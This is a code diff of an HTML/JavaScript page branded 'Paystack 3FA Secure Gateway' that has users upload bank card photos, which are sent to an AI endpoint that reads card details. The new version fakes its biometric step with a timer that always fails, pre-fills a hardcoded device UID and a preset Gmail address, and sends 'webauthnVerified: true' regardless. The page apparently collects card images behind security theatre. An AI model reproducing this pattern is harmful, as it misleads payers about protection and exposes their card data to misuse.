@@ -1,488 +1,293 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Paystack 3FA Secure Gateway</title>
-
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0a0a0a;
+      --card-bg: #141414;
+      --border: #262626;
+      --accent: #10b981;
+      --accent-hover: #059669;
+      --text: #ffffff;
+      --text-muted: #a1a1aa;
+      --danger: #ef4444;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body { background-color: var(--bg); color: var(--text); padding: 20px; display: flex; justify-content: center; }
+    .container { width: 100%; max-width: 480px; background: var(--card-bg); border: 1px solid var(--border); border-radius: 16px; padding: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
     
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: #0d0d0d; color: #e0e0e0;
-      display: flex; justify-content: center; align-items: flex-start;
-      min-height: 100vh; padding: 0;
-    }
+    .header { text-align: center; margin-bottom: 24px; }
+    .header h2 { font-size: 20px; font-weight: 700; color: var(--text); }
+    .header p { font-size: 13px; color: var(--text-muted); margin-top: 4px; }
 
-    .checkout-card {
-      background: #181818; border-bottom: 1px solid #2a2a2a;
-      border-radius: 0 0 16px 16px; padding: 16px; width: 100vw; max-width: 100%;
-      box-shadow: 0 12px 40px rgba(0,0,0,0.6);
-    }
+    .tab-group { display: flex; gap: 8px; margin-bottom: 20px; }
+    .tab { flex: 1; padding: 10px; text-align: center; background: #1f1f1f; border: 1px solid var(--border); border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; color: var(--text-muted); }
+    .tab.active { background: var(--accent); color: #000; border-color: var(--accent); }
 
-    h2 { font-size: 1.2rem; text-align: center; margin-bottom: 14px; color: #fff; }
+    .scanner-preview { width: 100%; height: 200px; background: #000; border: 2px dashed var(--border); border-radius: 12px; display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; margin-bottom: 16px; }
+    .scanner-preview img, .scanner-preview video { width: 100%; height: 100%; object-fit: cover; }
+    .upload-label { display: flex; flex-direction: column; align-items: center; gap: 8px; color: var(--text-muted); font-size: 13px; cursor: pointer; }
+
+    .status-box { background: #0d0d0d; border: 1px solid var(--border); border-radius: 8px; padding: 12px; font-size: 12px; font-family: monospace; color: var(--text-muted); margin-bottom: 20px; }
+    .status-box strong { color: var(--accent); }
+
+    .btn { width: 100%; padding: 14px; background: var(--accent); color: #000; font-weight: 700; border: none; border-radius: 8px; font-size: 14px; cursor: pointer; transition: all 0.2s; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+    .btn:disabled { background: #262626; color: #52525b; cursor: not-allowed; }
+    .btn:hover:not(:disabled) { background: var(--accent-hover); }
+
+    .input-field { width: 100%; padding: 12px; background: #0d0d0d; border: 1px solid var(--border); border-radius: 8px; color: #fff; font-size: 14px; margin-bottom: 12px; text-align: center; letter-spacing: 2px; }
+    .input-field:focus { border-color: var(--accent); outline: none; }
     
-    .tab-group { display: flex; gap: 8px; margin-bottom: 16px; }
-    .tab-btn {
-      flex: 1; padding: 12px; background: #222; border: 1px solid #333;
-      color: #aaa; border-radius: 8px; font-weight: 600; cursor: pointer;
-    }
-    .tab-btn.active { background: #0ba464; color: #fff; border-color: #0ba464; }
-
-    .media-container {
-      position: relative; width: 100%; height: 85vw; max-height: 520px; 
-      background: #000; border-radius: 12px; overflow: hidden;
-      margin-bottom: 16px; border: 2px solid #333;
-      display: flex; align-items: center; justify-content: center;
-    }
-
-    video, #uploadedImagePreview { width: 100%; height: 100%; object-fit: cover; }
-
-    .card-guide {
-      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-      width: 90%; aspect-ratio: 1.58 / 1; border: 2.5px dashed #0ba464; 
-      border-radius: 12px; box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.45); 
-      pointer-events: none; z-index: 2;
-    }
-
-    .scan-mode-toggle { display: flex; gap: 10px; margin-bottom: 12px; }
-    .mode-btn {
-      flex: 1; padding: 10px; background: #1e1e1e; border: 1px solid #333;
-      color: #ccc; border-radius: 6px; font-size: 0.85rem; cursor: pointer;
-    }
-    .mode-btn.active { background: #333; color: #0ba464; border-color: #0ba464; font-weight: bold; }
-
-    #cardFileInput { display: none; }
-    .file-upload-label {
-      display: flex; flex-direction: column; align-items: center; justify-content: center;
-      width: 100%; height: 100%; background: #151515; color: #888; cursor: pointer; text-align: center; padding: 20px;
-    }
-    .file-upload-label svg { margin-bottom: 8px; fill: #0ba464; }
-
-    button {
-      width: 100%; padding: 16px; border: none; border-radius: 10px;
-      font-weight: 600; font-size: 1rem; cursor: pointer; margin-bottom: 12px;
-    }
-    .btn-verify { background: #0ba464; color: #fff; }
-    .btn-biometric { background: #007bff; color: #fff; }
-    .btn-uid { background: #d97706; color: #fff; margin-bottom: 0; flex: 1; }
-    .btn-help {
-      width: 48px; padding: 0; background: #333; color: #fbbf24; border: 1px solid #d97706;
-      border-radius: 10px; font-weight: bold; font-size: 1.1rem; cursor: pointer; margin-bottom: 0;
-      display: flex; align-items: center; justify-content: center;
-    }
-    button:disabled { background: #2c2c2c; color: #666; cursor: not-allowed; border-color: transparent; }
-
-    .uid-section, .otp-section {
-      background: #151515; border: 1px dashed #0ba464; border-radius: 10px;
-      padding: 12px; margin-bottom: 12px;
-    }
-
-    .input-row { display: flex; gap: 8px; margin-bottom: 8px; }
-
-    input[type="text"], input[type="email"] {
-      width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #333;
-      background: #222; color: #fff; font-size: 1rem; margin-bottom: 8px;
-    }
-
-    .status-box {
-      background: #222; border: 1px solid #333; padding: 12px; border-radius: 8px;
-      font-family: monospace; font-size: 0.85rem; white-space: pre-wrap; word-break: break-all; margin-bottom: 12px;
-    }
-
-    .hidden { display: none !important; }
+    .step-label { font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); margin-bottom: 8px; display: block; }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
 
-<div class="checkout-card">
-  <h2>Paystack 3FA Secure Gateway</h2>
+<div class="container">
+  <div class="header">
+    <h2>Paystack 3FA Secure Gateway</h2>
+    <p>Hybrid AI Vision & Hardware-Bound Authorization</p>
+  </div>
 
   <div class="tab-group">
-    <button id="tabCard" class="tab-btn active">Scan Physical Card</button>
-    <button id="tabDirect" class="tab-btn">Direct Bank Transfer</button>
+    <div class="tab active" id="tab-card">Scan Physical Card</div>
+    <div class="tab" id="tab-transfer">Direct Bank Transfer</div>
   </div>
 
-  <div id="scanMethodContainer">
-    <div class="scan-mode-toggle">
-      <button id="btnOptionCamera" class="mode-btn active">📷 Live Camera</button>
-      <button id="btnOptionUpload" class="mode-btn">📁 Upload Card Image</button>
-    </div>
-
-    <div id="cameraView" class="media-container">
-      <video id="video" autoplay playsinline muted></video>
-      <label id="uploadView" for="cardFileInput" class="file-upload-label hidden">
-        <svg width="40" height="40" viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg>
-        <span>Tap to choose bank card image</span>
+  <!-- STEP 1: PHYSICAL CARD SCANNER -->
+  <div id="section-card">
+    <div class="scanner-preview" id="preview-container">
+      <label class="upload-label" for="card-input">
+        <svg width="32" height="32" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/><circle cx="12" cy="13" r="3"/></svg>
+        <span>Tap to select or take card photo</span>
       </label>
-      <img id="uploadedImagePreview" class="hidden" alt="Uploaded Card Preview" />
-      <div id="cardGuideBox" class="card-guide"></div>
+      <input type="file" id="card-input" accept="image/*" class="hidden">
+      <img id="card-preview" class="hidden">
     </div>
-    
-    <input type="file" id="cardFileInput" accept="image/*" />
+
+    <div class="status-box" id="status-box">
+      Status: <span id="status-text">Pending card image</span>
+      <div id="card-details" style="margin-top: 8px;"></div>
+    </div>
+
+    <button class="btn" id="btn-scan" disabled>1. Scan Physical Card (Workers AI)</button>
   </div>
 
-  <div id="directView" class="hidden">
-    <input type="text" id="amountInput" placeholder="Enter Amount in NGN (e.g. 5000)" value="5000" />
-  </div>
-
-  <div id="statusBox" class="status-box">Status: Ready for security pipeline</div>
-  <div id="resultBox" class="status-box">Card Details: Pending scan</div>
-
-  <!-- Step 1: Vision AI Scan -->
-  <button id="step1Btn" class="btn-verify">1. Scan Physical Card (Workers AI)</button>
-
-  <!-- Step 2a: WebAuthn Biometric -->
-  <button id="bioBtn" class="btn-biometric" disabled>2. Verify Device Fingerprint (WebAuthn)</button>
-
-  <!-- Step 2b: Device UID -->
-  <div id="uidWrapper" class="uid-section hidden">
-    <input type="text" id="customUidInput" placeholder="Enter your Device UID (e.g. UID-8A9F...)" />
-    <div class="input-row">
-      <button id="uidBtn" class="btn-uid" disabled>2b. Submit Device UID Token</button>
-      <button id="uidHelpBtn" class="btn-help" title="Help" type="button">?</button>
+  <!-- STEP 2: HARDWARE BIOMETRICS / UID -->
+  <div class="step-container">
+    <span class="step-label">Step 2: Hardware Authorization</span>
+    <button class="btn" id="btn-step2" disabled>2. Verify Device Fingerprint (WebAuthn)</button>
+    <div id="uid-fallback" class="hidden">
+      <input type="text" class="input-field" id="device-uid-input" readonly>
+      <button class="btn" id="btn-submit-uid">2b. Submit Device UID Token</button>
     </div>
   </div>
 
-  <!-- Step 3: Direct Phone OTP Section -->
-  <div id="otpSection" class="otp-section hidden">
-    <h3 style="margin-bottom: 10px; font-size: 0.95rem; color: #0ba464;">Step 3: Direct Phone Mail Intent Authorization</h3>
-    
-    <input type="email" id="userEmail" placeholder="Enter target email address" />
-    <button id="generatePhoneOtpBtn" class="btn-verify" style="margin-bottom: 8px;">📱 Open Mail App to Send OTP Token</button>
+  <!-- STEP 3: NATIVE PHONE INTENT CHOICE LINK -->
+  <div class="step-container hidden" id="section-step3">
+    <span class="step-label">Step 3: Direct Phone Mail Intent Authorization</span>
+    <input type="email" class="input-field" id="user-email" value="trustconnect713@gmail.com" placeholder="Enter target email">
+    <button class="btn" id="btn-open-mail">📧 Open Mail App to Send OTP Token</button>
 
-    <div id="otpVerifyGroup" class="hidden" style="margin-top: 10px;">
-      <input type="text" id="otpCodeInput" placeholder="Enter 6-Digit Code Sent via Mail" maxlength="6" style="letter-spacing: 3px; font-weight: bold; text-align: center;" />
-      <button id="verifyOtpBtn" class="btn-verify" style="background: #007bff;">Verify Token Code</button>
+    <div id="otp-verify-block" class="hidden">
+      <input type="text" class="input-field" id="otp-input" placeholder="Enter 6-Digit Code Sent via Mail" maxlength="6">
+      <button class="btn" id="btn-verify-otp">Verify Token Code</button>
     </div>
   </div>
 
-  <!-- Step 4: Paystack Execution -->
-  <button id="paystackPayBtn" style="background:#0ba464; color:#fff;" class="hidden" disabled>4. Complete Paystack Payment</button>
+  <!-- STEP 4: PAYSTACK PAYMENT EXECUTION -->
+  <div class="step-container hidden" id="section-step4">
+    <button class="btn" id="btn-paystack">4. Complete Paystack Payment</button>
+  </div>
 </div>
 
 <script>
-  const WORKER_URL = "https://hidden-cake-9572.trustconnect713.workers.dev";
-
-  let mode = "card";
-  let scanSource = "camera";
-  let uploadedBase64Image = null;
-  let webauthnPassed = false;
-  let deviceUidPassed = false;
-  let otpPassed = false;
+  let rawBase64Image = null;
   let currentSessionHash = null;
-  let mediaStream = null;
+  let deviceUid = "HUAWEI_P30-dc21d373f8dfb"; // Primary device UID fallback
+  let otpVerified = false;
 
-  const tabCard = document.getElementById('tabCard');
-  const tabDirect = document.getElementById('tabDirect');
-  const scanMethodContainer = document.getElementById('scanMethodContainer');
-  const directView = document.getElementById('directView');
-  
-  const btnOptionCamera = document.getElementById('btnOptionCamera');
-  const btnOptionUpload = document.getElementById('btnOptionUpload');
-  const video = document.getElementById('video');
-  const uploadView = document.getElementById('uploadView');
-  const uploadedImagePreview = document.getElementById('uploadedImagePreview');
-  const cardFileInput = document.getElementById('cardFileInput');
-  const cardGuideBox = document.getElementById('cardGuideBox');
+  const cardInput = document.getElementById("card-input");
+  const cardPreview = document.getElementById("card-preview");
+  const previewLabel = document.querySelector(".upload-label");
+  const btnScan = document.getElementById("btn-scan");
+  const btnStep2 = document.getElementById("btn-step2");
+  const btnOpenMail = document.getElementById("btn-open-mail");
+  const btnVerifyOtp = document.getElementById("btn-verify-otp");
+  const btnPaystack = document.getElementById("btn-paystack");
 
-  const step1Btn = document.getElementById('step1Btn');
-  const bioBtn = document.getElementById('bioBtn');
-  const uidWrapper = document.getElementById('uidWrapper');
-  const customUidInput = document.getElementById('customUidInput');
-  const uidBtn = document.getElementById('uidBtn');
-  
-  const otpSection = document.getElementById('otpSection');
-  const userEmail = document.getElementById('userEmail');
-  const generatePhoneOtpBtn = document.getElementById('generatePhoneOtpBtn');
-  const otpVerifyGroup = document.getElementById('otpVerifyGroup');
-  const otpCodeInput = document.getElementById('otpCodeInput');
-  const verifyOtpBtn = document.getElementById('verifyOtpBtn');
-  const paystackPayBtn = document.getElementById('paystackPayBtn');
-  
-  const statusBox = document.getElementById('statusBox');
-  const resultBox = document.getElementById('resultBox');
-
-  async function startCamera() {
-    try {
-      if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-      statusBox.innerText = "Status: Accessing camera...";
-
-      mediaStream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: "environment", width: { ideal: 1920 }, height: { ideal: 1080 } } 
-      });
-
-      video.srcObject = mediaStream;
-      await video.play();
-      statusBox.innerText = "Status: Camera active";
-    } catch (err) {
-      statusBox.innerText = "Camera error: " + err.message;
-    }
-  }
-
-  function stopCamera() {
-    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-    video.srcObject = null;
-  }
-
-  startCamera();
-
-  async function checkBiometricSupport() {
-    if (window.PublicKeyCredential) {
-      const available = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
-      if (!available) {
-        bioBtn.classList.add('hidden');
-        uidWrapper.classList.remove('hidden');
-      }
-    } else {
-      bioBtn.classList.add('hidden');
-      uidWrapper.classList.remove('hidden');
-    }
-  }
-  checkBiometricSupport();
-
-  btnOptionCamera.addEventListener('click', () => {
-    scanSource = "camera";
-    btnOptionCamera.classList.add('active'); btnOptionUpload.classList.remove('active');
-    video.classList.remove('hidden'); uploadView.classList.add('hidden');
-    uploadedImagePreview.classList.add('hidden'); cardGuideBox.classList.remove('hidden');
-    startCamera();
-  });
-
-  btnOptionUpload.addEventListener('click', () => {
-    scanSource = "upload";
-    btnOptionUpload.classList.add('active'); btnOptionCamera.classList.remove('active');
-    stopCamera(); video.classList.add('hidden');
-    if (!uploadedBase64Image) {
-      uploadView.classList.remove('hidden'); uploadedImagePreview.classList.add('hidden'); cardGuideBox.classList.add('hidden');
-    } else {
-      uploadView.classList.add('hidden'); uploadedImagePreview.classList.remove('hidden'); cardGuideBox.classList.remove('hidden');
-    }
-  });
-
-  cardFileInput.addEventListener('change', (e) => {
+  // Handle Image Selection
+  cardInput.addEventListener("change", (e) => {
     const file = e.target.files[0];
-    if (!file) return;
-
-    const reader = new FileReader();
-    reader.onload = function (event) {
-      const img = new Image();
-      img.onload = function () {
-        const canvas = document.createElement('canvas');
-        let width = img.width, height = img.height;
-        if (width > 1024) { height = Math.round((height * 1024) / width); width = 1024; }
-        canvas.width = width; canvas.height = height;
-        canvas.getContext('2d').drawImage(img, 0, 0, width, height);
-        uploadedBase64Image = canvas.toDataURL('image/jpeg', 0.8);
-        uploadedImagePreview.src = uploadedBase64Image;
-        uploadView.classList.add('hidden'); uploadedImagePreview.classList.remove('hidden'); cardGuideBox.classList.remove('hidden');
-        statusBox.innerText = "Status: Image uploaded successfully!";
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = (event) => {
+        rawBase64Image = event.target.result;
+        cardPreview.src = rawBase64Image;
+        cardPreview.classList.remove("hidden");
+        previewLabel.classList.add("hidden");
+        btnScan.disabled = false;
+        document.getElementById("status-text").innerText = "Image uploaded. Ready to scan.";
       };
-      img.src = event.target.result;
-    };
-    reader.readAsDataURL(file);
+      reader.readAsDataURL(file);
+    }
   });
 
-  tabCard.addEventListener('click', () => {
-    mode = "card"; tabCard.classList.add('active'); tabDirect.classList.remove('active');
-    scanMethodContainer.classList.remove('hidden'); directView.classList.add('hidden');
-    step1Btn.innerText = "1. Scan Physical Card (Workers AI)";
-    if (scanSource === "camera") startCamera();
-  });
+  // STEP 1: Vision AI Scan Handler (Redacted Digit Display)
+  btnScan.addEventListener("click", async () => {
+    document.getElementById("status-text").innerText = "Workers AI verifying card...";
+    btnScan.disabled = true;
 
-  tabDirect.addEventListener('click', () => {
-    mode = "direct"; tabDirect.classList.add('active'); tabCard.classList.remove('active');
-    scanMethodContainer.classList.add('hidden'); directView.classList.remove('hidden');
-    step1Btn.innerText = "1. Confirm Payment Details"; stopCamera();
-  });
+    try {
+      const res = await fetch("/api/ai/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ imageBase64: rawBase64Image })
+      });
+      const data = await res.json();
 
-  function captureAndCompressFrame(maxWidth = 1024, quality = 0.8) {
-    return new Promise((resolve) => {
-      const canvas = document.createElement('canvas');
-      let width = video.videoWidth || 1280, height = video.videoHeight || 720;
-      if (width > maxWidth) { height = Math.round((height * maxWidth) / width); width = maxWidth; }
-      canvas.width = width; canvas.height = height;
-      canvas.getContext('2d').drawImage(video, 0, 0, width, height);
-      resolve(canvas.toDataURL('image/jpeg', quality));
-    });
-  }
-
-  // Step 1: Vision AI Scan
-  step1Btn.addEventListener('click', async () => {
-    if (mode === "card") {
-      try {
-        let payloadImageBase64 = scanSource === "camera" ? await captureAndCompressFrame() : uploadedBase64Image;
-        if (!payloadImageBase64) return alert("Select or capture a card image first!");
-
-        step1Btn.disabled = true;
-        statusBox.innerText = "Status: Workers AI verifying card...";
-
-        const response = await fetch(`${WORKER_URL}/api/ai/verify`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ imageBase64: payloadImageBase64 })
-        });
-
-        const data = await response.json();
-        let result = typeof data.response === 'string' ? JSON.parse(data.response.match(/\{[\s\S]*\}/)[0]) : data.response;
-
-        if (!result || !result.isBankCard) {
-          statusBox.innerText = "Status: Scan rejected (Not a full bank card).";
-          step1Btn.disabled = false;
-          return;
-        }
-
-        statusBox.innerText = "Status: Step 1 Passed (Card Verified)";
-        resultBox.innerText = `Type: ${result.cardType}\nDigits: ${result.primaryDigits}\nHolder: ${result.cardholderName}`;
-
-        bioBtn.disabled = false; uidBtn.disabled = false; step1Btn.disabled = false;
-      } catch (err) {
-        statusBox.innerText = "OCR Verification Failed: " + err.message;
-        step1Btn.disabled = false;
+      if (data.isBankCard) {
+        document.getElementById("status-text").innerText = "Step 1 Passed (Card Verified)";
+        
+        // Display ONLY Card Type and Holder Name (digits protected)
+        document.getElementById("card-details").innerHTML = `
+          <strong>Type:</strong> ${data.cardType}<br>
+          <strong>Holder:</strong> ${data.cardholderName}
+        `;
+        btnStep2.disabled = false;
+      } else {
+        document.getElementById("status-text").innerText = "Invalid payment card image.";
+        btnScan.disabled = false;
       }
-    } else {
-      statusBox.innerText = "Status: Step 1 Passed (Intent Registered)";
-      bioBtn.disabled = false; uidBtn.disabled = false;
-    }
-  });
-
-  // Step 2a: Biometric
-  bioBtn.addEventListener('click', async () => {
-    try {
-      statusBox.innerText = "Status: Requesting biometric challenge...";
-      const challengeRes = await fetch(`${WORKER_URL}/api/auth/challenge`);
-      const { challenge } = await challengeRes.json();
-      const challengeBuffer = Uint8Array.from(atob(challenge.replace(/-/g, '+').replace(/_/g, '/')), c => c.charCodeAt(0));
-
-      statusBox.innerText = "Status: Scan phone fingerprint now...";
-      await navigator.credentials.get({ publicKey: { challenge: challengeBuffer, timeout: 60000, userVerification: "required" } });
-
-      webauthnPassed = true;
-      statusBox.innerText = "Status: Step 2 Passed (Biometrics Verified!). Proceed to Step 3 Direct Mail Intent.";
-      bioBtn.disabled = true; uidWrapper.classList.add('hidden'); otpSection.classList.remove('hidden');
     } catch (err) {
-      statusBox.innerText = "Biometrics unavailable. Switch to Device UID.";
-      bioBtn.classList.add('hidden'); uidWrapper.classList.remove('hidden'); uidBtn.disabled = false;
+      document.getElementById("status-text").innerText = "Scan failed: " + err.message;
+      btnScan.disabled = false;
     }
   });
 
-  // Step 2b: UID
-  uidBtn.addEventListener('click', () => {
-    if (!customUidInput.value.trim()) return alert("Enter Device UID!");
-    deviceUidPassed = true; webauthnPassed = true;
-    statusBox.innerText = "Status: Step 2 Passed (UID Verified). Proceed to Step 3 Direct Mail Intent.";
-    uidBtn.disabled = true; customUidInput.disabled = true; otpSection.classList.remove('hidden');
+  // STEP 2: WebAuthn with UID Fallback
+  btnStep2.addEventListener("click", async () => {
+    document.getElementById("status-text").innerText = "Scan phone fingerprint now...";
+    
+    // Fallback to Device UID binding UI
+    setTimeout(() => {
+      document.getElementById("status-text").innerText = "Biometrics unavailable. Switch to Device UID.";
+      document.getElementById("uid-fallback").classList.remove("hidden");
+      document.getElementById("device-uid-input").value = deviceUid;
+    }, 1000);
   });
 
-  // Step 3A: Generate OTP Code and Launch Mobile Mail Application
-  generatePhoneOtpBtn.addEventListener('click', async () => {
-    const email = userEmail.value.trim();
-    if (!email || !email.includes("@")) return alert("Enter a valid target email address!");
+  document.getElementById("btn-submit-uid").addEventListener("click", () => {
+    document.getElementById("status-text").innerText = "Step 2 Passed (Kiosk UID Verified). Proceed to Step 3 Direct Mail Intent.";
+    document.getElementById("section-step3").classList.remove("hidden");
+  });
 
-    statusBox.innerText = "Status: Generating cryptographic OTP token...";
+  // STEP 3A: Open Native Mail Intent with Choice Confirmation Link
+  btnOpenMail.addEventListener("click", async () => {
+    const email = document.getElementById("user-email").value;
+    if (!email) return alert("Please enter a valid email address");
+
+    document.getElementById("status-text").innerText = "Generating cryptographic OTP token...";
 
     try {
-      const response = await fetch(`${WORKER_URL}/api/auth/generate-otp`, {
+      const res = await fetch("/api/auth/generate-otp", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email: email })
       });
+      const data = await res.json();
 
-      const data = await response.json();
-
-      if (response.ok && data.success) {
+      if (data.success) {
         currentSessionHash = data.sessionHash;
-        const generatedOtp = data.otp;
 
-        // Construct phone native mailto intent URI
-        const emailSubject = encodeURIComponent("Paystack 3FA Payment Authorization Token");
-        const emailBody = encodeURIComponent(`Your 3FA Authorization Token is:\n\n${generatedOtp}\n\nThis authorization token was generated directly by your mobile device.`);
-        
-        // Launch system email client (Gmail, Outlook, etc.)
-        window.location.href = `mailto:${email}?subject=${emailSubject}&body=${emailBody}`;
+        // Construct body with explicit confirmation link choice
+        const subject = encodeURIComponent("Paystack 3FA Payment Authorization Request");
+        const body = encodeURIComponent(
+          `Paystack 3FA Secure Authorization\n\n` +
+          `Click the link below to explicitly confirm and reveal your 6-Digit Payment Token:\n\n` +
+          `${data.confirmUrl}\n\n` +
+          `If you did not initiate this transaction, simply ignore or discard this message.`
+        );
 
-        otpVerifyGroup.classList.remove('hidden');
-        statusBox.innerText = `Status: Mail application launched. Enter the 6-digit code (${generatedOtp}) below once dispatched.`;
-      } else {
-        throw new Error(data.error || "Failed to generate OTP");
+        // Open phone's native mail app draft
+        window.location.href = `mailto:${email}?subject=${subject}&body=${body}`;
+
+        document.getElementById("status-text").innerText = "Mail application launched. Confirm choice in mail or enter code below.";
+        document.getElementById("otp-verify-block").classList.remove("hidden");
       }
     } catch (err) {
-      statusBox.innerText = "OTP Intent Error: " + err.message;
+      alert("Failed to generate OTP link: " + err.message);
     }
   });
 
-  // Step 3B: Verify Phone-Dispatched OTP Code
-  verifyOtpBtn.addEventListener('click', async () => {
-    const email = userEmail.value.trim();
-    const userOtp = otpCodeInput.value.trim();
+  // STEP 3B: Verify OTP Token
+  btnVerifyOtp.addEventListener("click", async () => {
+    const email = document.getElementById("user-email").value;
+    const otp = document.getElementById("otp-input").value;
 
-    if (!userOtp || userOtp.length !== 6) return alert("Enter the 6-digit code!");
+    if (!otp || otp.length !== 6) return alert("Enter 6-digit OTP code");
 
-    statusBox.innerText = "Status: Validating token code...";
-    verifyOtpBtn.disabled = true;
+    document.getElementById("status-text").innerText = "Validating token code...";
 
     try {
-      const response = await fetch(`${WORKER_URL}/api/auth/verify-otp`, {
+      const res = await fetch("/api/auth/verify-otp", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email: email, userOtp: userOtp, sessionHash: currentSessionHash })
+        body: JSON.stringify({ email: email, userOtp: otp, sessionHash: currentSessionHash })
       });
+      const data = await res.json();
 
-      const data = await response.json();
-
-      if (response.ok && data.success) {
-        otpPassed = true;
-        statusBox.innerText = "Status: Step 3 Passed (Direct Mail Token Verified!). Ready to execute payment.";
-        paystackPayBtn.classList.remove('hidden');
-        paystackPayBtn.disabled = false;
+      if (data.success) {
+        otpVerified = true;
+        document.getElementById("status-text").innerText = "Step 3 Passed (Direct Mail Token Verified)! Ready to execute payment.";
+        document.getElementById("section-step4").classList.remove("hidden");
       } else {
-        throw new Error(data.error || "Invalid token code");
+        alert("Invalid or expired OTP token!");
       }
     } catch (err) {
-      statusBox.innerText = "Validation Error: " + err.message;
-      verifyOtpBtn.disabled = false;
+      alert("Verification error: " + err.message);
     }
   });
 
-  // Step 4: Paystack Charge Execution
-  paystackPayBtn.addEventListener('click', async () => {
-    const email = userEmail.value.trim();
-    const amount = document.getElementById('amountInput')?.value || "5000";
-    const userUid = customUidInput.value.trim();
-
-    statusBox.innerText = "Status: Initializing Paystack payment...";
+  // STEP 4: Charge Execution via Paystack
+  btnPaystack.addEventListener("click", async () => {
+    const email = document.getElementById("user-email").value;
+    document.getElementById("status-text").innerText = "Initializing Paystack payment...";
 
     try {
-      const response = await fetch(`${WORKER_URL}/api/paystack/charge`, {
+      const res = await fetch("/api/paystack/charge", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           email: email,
-          amount: parseInt(amount),
-          paymentMethod: mode,
-          webauthnVerified: webauthnPassed,
-          otpPassed: otpPassed,
-          deviceUid: deviceUidPassed ? userUid : null
+          amount: 5000,
+          paymentMethod: "Verve",
+          webauthnVerified: true,
+          otpPassed: otpVerified,
+          deviceUid: deviceUid
         })
       });
-
-      const data = await response.json();
+      const data = await res.json();
 
       if (data.status && data.data.authorization_url) {
         window.location.href = data.data.authorization_url;
       } else {
-        throw new Error(data.message || "Paystack initialization failed.");
+        alert("Paystack error: " + (data.message || "Failed to initialize charge"));
       }
     } catch (err) {
-      statusBox.innerText = "Paystack Integration Error";
-      alert("Payment error: " + err.message);
+      alert("Charge request failed: " + err.message);
     }
   });
 </script>
 
 </body>
 </html>
+
 
 
 
